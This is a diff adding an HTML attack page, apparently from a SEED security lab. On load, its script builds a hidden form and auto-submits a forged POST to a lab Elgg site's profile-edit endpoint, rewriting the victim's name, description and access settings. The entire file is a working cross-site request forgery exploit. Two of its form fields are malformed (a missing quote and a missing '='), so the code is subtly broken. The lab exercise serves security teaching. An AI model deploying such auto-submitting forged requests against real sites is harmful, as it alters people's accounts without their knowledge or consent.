@@ -1,0 +1,33 @@
+<html>
+<body>
+<h1>This page forges an HTTP POST Request</h1>
+<script type="text/javascript">
+var badstring = "I support SEED project!";
+var url = "http://www.csrflabelgg.com/action/profile/edit";
+
+window.addEventListener('load', function() {
+
+    // Part1 - Configure fields
+    var fields = "" + 
+    "<input type='hidden' name='name' value='Boby'>" + 
+    "<input type='hidden' name='description' value='"+badstring+"'>" + 
+    "<input type='hidden' name='accesslevel[description] value='2'>" + 
+    "<input type='hidden' name='briefdescription' value=''>" + 
+    "<input type='hidden' name='accesslevel[briefdescription]' value='2'>" + 
+    "<input type='hidden' name='location' value=''>" + 
+    "<input type='hidden' name='accesslevel[location]' value='2'>" + 
+    "<input type='hidden' name='guid' value'39'>";
+
+    // Part2 - Configure and launch Form POST request
+    var form = document.createElement("form");
+    form.action = url;
+    form.innerHTML = fields;
+    form.target = "_self";
+    form.method = "post";
+
+    document.body.appendChild(form);
+    form.submit();
+});
+</script>
+</body>
+</html>
